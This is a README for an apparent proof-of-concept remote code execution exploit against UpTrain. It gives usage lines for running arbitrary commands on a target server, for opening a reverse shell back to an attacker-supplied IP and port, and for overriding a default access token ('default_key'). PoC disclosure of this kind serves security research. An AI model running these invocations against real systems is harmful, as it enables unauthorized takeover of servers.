# UpTrain RCE Proof of Concept

This repository contains a Proof of Concept (PoC) script demonstrating a vulnerability in UpTrain. **This tool is for educational and authorized testing purposes only.**

## Usage


### Command Execution

To execute a single command:

```
python3 uptrain_exploit.py --url <target_url> --cmd "<command>"
```

Example:
```
python3 uptrain_exploit.py --url http://example.com:8000 --cmd "touch /tmp/zeropath"
```
Note: We do not capture the output of the command.

### Reverse Shell

To attempt a reverse shell connection:

```
python3 uptrain_exploit.py --url <target_url> --shell <your_ip> <your_port>
```

Example:
```
python3 uptrain_exploit.py --url http://example.com:8000 --shell 192.168.1.100 4444
```

### Additional Options

- `--token`: Specify a custom access token (default is 'default_key')

Example:
```
python3 uptrain_exploit.py --url http://example.com:8000 --cmd "touch /tmp/zeropath" --token "your_custom_token"
```
